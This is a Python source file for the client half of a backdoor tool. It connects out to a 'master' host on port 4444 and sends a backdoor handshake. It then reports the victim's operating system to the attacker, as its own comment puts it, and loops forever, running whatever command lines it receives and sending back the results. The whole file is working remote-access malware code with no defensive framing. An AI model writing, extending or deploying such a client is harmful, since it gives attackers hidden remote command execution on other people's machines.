#!/usr/bin/env python3
import os
import sys
import socket

from BDFramework import BDFramework
from BDProtocol import BDProtocol

class BDClient:

	def __init__(self, RHOST:str="127.0.0.1", RPORT:int=4444, verbose:bool=False):
		self.verbose = verbose
		self.RHOST = RHOST
		self.RPORT = RPORT
		self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.log = []
		self.framework = BDFramework()

	def connect(self) -> bool:

		# Connect with master
		try:
			self.s.connect((self.RHOST, self.RPORT))

		except Exception as exc:
			self.log.append("{}".format(str(exc)))
			return False

		# Initialize main handler
		self.log.append("Initializing backdoor protcol layer...")
		bdtcp = BDProtocol(self.s) # Create backdoor protocol layer

		# Send backdoor handshake
		self.log.append("Sending backdoor handshake...")
		bdtcp.send_msg('BD_HSK')

		# Get the core module from the framework
		self.log.append("Detecing OS and loading module...")
		coremodule, platform = self.framework.GetCoreModule()

		# Notify attacker about platform
		bdtcp.send_msg(platform)

		# Get Client Main Block
		handler = coremodule.ClientMain(bdtcp)

		# Enter fetch-work loop
		while True:

			# Wait for work from the client
			cmdline = bdtcp.recv_msg()

			print("CLIENT: Received commandline '{}'".format(cmdline))

			# Perform work
			result = handler.runCMD(cmdline)
			
			# Report response
			bdtcp.send_msg(result)

		return True

if __name__ == "__main__":
	client = BDClient()
	client.connect()
	print("\n".join(client.log))